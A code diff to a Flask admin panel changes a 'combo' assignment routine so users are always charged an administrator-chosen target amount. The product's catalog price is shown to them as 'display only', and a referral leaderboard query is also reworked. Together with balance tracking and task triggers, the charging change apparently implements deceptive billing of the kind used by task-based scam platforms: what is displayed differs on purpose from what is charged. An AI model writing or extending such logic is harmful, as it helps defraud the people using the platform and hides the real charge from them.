@@ -1194,10 +1194,9 @@ def assign_combo(user_id):
         if not candidates:
             flash("No products available near that amount.", "danger")
             return redirect(url_for("admin.view_user", user_id=user.id))
-        # Prefer price slightly above balance when possible
-        above = [p for p in candidates if float(p.price or 0) > bal]
-        pool = above if above else candidates
-        p1 = random.choice(pool)
+        # Display product only — prefer closest to target (charge uses target, not catalog)
+        candidates.sort(key=lambda x: abs(float(x.price or 0) - target))
+        p1 = candidates[0]
 
     # Use ADMIN TARGET as the charged combo amount (catalog price is display only).
     # This fixes cases where no product exists near 900k and nearest was ~16k.
@@ -1232,14 +1231,22 @@ def assign_combo(user_id):
         if hasattr(combo, attr):
             setattr(combo, attr, val)
 
+    # ALWAYS charge admin target (never catalog price)
+    charge = float(target)
+    if charge <= 0:
+        charge = float(p1.price or 0)
+    combo.amount = charge
+    combo.product1_price = charge
+    if hasattr(combo, "notes") and not notes:
+        combo.notes = f"CHARGE={charge:,.0f} (target) · catalog display was {float(p1.price or 0):,.0f}"
+
     db.session.add(combo)
     db.session.commit()
 
-    # Prefer combo manager when assigned from there
-    next_page = request.form.get("next") or request.referrer or ""
     flash(
-        f"Combo assigned: {p1.name} charged at {price:,.0f} "
-        f"(admin target). User balance {bal:,.0f} → projected {bal - price:,.0f} after trigger. "
+        f"Combo assigned: {p1.name} will CHARGE {charge:,.0f} "
+        f"(your target {target:,.0f}). Catalog price {float(p1.price or 0):,.0f} is display only. "
+        f"Balance {bal:,.0f} → after trigger ~{bal - charge:,.0f}. "
         f"Auto at task #{combo.trigger_task}.",
         "success",
     )
@@ -3246,12 +3253,39 @@ def export_team_users_csv():
 @login_required
 @admin_required
 def referral_leaderboard():
-    leaders = (
-        User.query.filter(User.referral_count > 0)
-        .order_by(User.referral_count.desc())
-        .limit(50)
-        .all()
-    )
+    leaders = []
+    try:
+        from sqlalchemy import func
+        leaders = (
+            User.query
+            .filter(User.is_admin.is_(False))
+            .filter((User.referral_count.isnot(None)) & (User.referral_count > 0))
+            .order_by(User.referral_count.desc())
+            .limit(50)
+            .all()
+        )
+    except Exception as e:
+        try:
+            db.session.rollback()
+        except Exception:
+            pass
+        print("leaderboard query:", e)
+        try:
+            leaders = (
+                User.query
+                .order_by(User.id.desc())
+                .limit(50)
+                .all()
+            )
+            leaders = [u for u in leaders if int(getattr(u, "referral_count", 0) or 0) > 0]
+            leaders.sort(key=lambda u: int(getattr(u, "referral_count", 0) or 0), reverse=True)
+        except Exception as e2:
+            try:
+                db.session.rollback()
+            except Exception:
+                pass
+            print("leaderboard fallback:", e2)
+            leaders = []
     return render_template("admin/leaderboard.html", leaders=leaders)
 
 
